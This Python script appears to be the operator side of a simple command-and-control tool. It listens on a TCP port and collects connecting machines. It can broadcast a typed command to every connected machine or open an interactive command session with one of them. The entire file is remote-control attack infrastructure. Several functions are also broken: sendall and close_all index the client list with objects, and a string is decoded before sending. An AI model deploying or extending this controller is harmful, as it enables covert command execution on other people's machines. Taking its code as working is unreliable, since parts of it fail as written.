import socket
from threading import Thread
import sys

global sock_list
sock_list = []

class Client():
    def __init__(self,sock,ip):
        self.sock = sock
        self.ip = ip

def socket_create():
    global s
    global PORT
    global HOST
    PORT = 5545
    HOST = ''
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind((HOST,PORT))
    s.listen(60)
    while True:
        clis , addr = s.accept()
        sock_list.append(Client(clis,addr))
        print("Connected : ",end="")


def listele():
    if sock_list == []:
        print("No one has been connected yet :D")
    for i,j in enumerate(sock_list):
        print("Connected {} : {} ".format(i,j.ip))

def sendall():
    if sock_list == []:
        print("No one has been connected yet :D")
    else:
        com = input("Enter command that will run all connected machines :")
        for i in sock_list:
            sock_list[i].sock.send(com.decode('utf-8'))

def close_all():
    for i in sock_list:
        sock_list[i].sock.close()


def ana_menu():
    while True:
        c = str(input("\ncagri@bfl:~> "))
        if c == "quit":
            close_all()
            s.close()
            sys.exit()
        elif c == "list":
            listele()
            continue
        elif c[:6] == "selend":
            target = int(c[7:])
            target_sock = sock_list[target].sock
            target_ip = sock_list[target].ip
            sel_end(target_sock,target_ip)
            break
        elif c == "sendall":
            sendall()
        else:
            print("Try something")


def sel_end(sock,ip):
    while True: 
        data = input("{}> ".format(ip[0]))
        if data == "quit":
            break
        sock.send(data.encode("utf-8"))
        cli_recv = sock.recv(10024).decode('utf-8')
        print("{}> {}".format(ip[0],cli_recv))

    t1 = Thread(target=ana_menu)
    t1.daemon = True
    t1.start()

    
def main():
    t1 = Thread(target=socket_create)
    t1.start()
    t2 = Thread(target=ana_menu)
    t2.start()


main()


        
